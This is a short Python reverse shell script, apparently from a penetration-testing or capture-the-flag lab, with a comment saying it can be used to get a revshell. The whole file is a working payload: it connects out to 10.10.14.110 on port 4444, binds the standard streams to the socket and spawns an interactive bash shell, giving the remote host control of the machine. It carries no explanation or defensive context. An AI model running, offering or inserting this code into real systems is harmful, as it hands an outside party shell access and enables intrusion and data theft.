#!/usr/bin/env python3                                                                                                                                                                                            
import socket,subprocess,os                                                                                                                                                                                       
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)                                                                                                                                                                
s.connect(("10.10.14.110",4444))                                                                                                                                                                                  
os.dup2(s.fileno(),0)                                                                                                                                                                                             
os.dup2(s.fileno(),1)                                                                                                                                                                                             
os.dup2(s.fileno(),2)                                                                                                                                                                                             
import pty                                                                                                                                                                                                        
pty.spawn("/bin/bash")

#Can be used to get a revshell
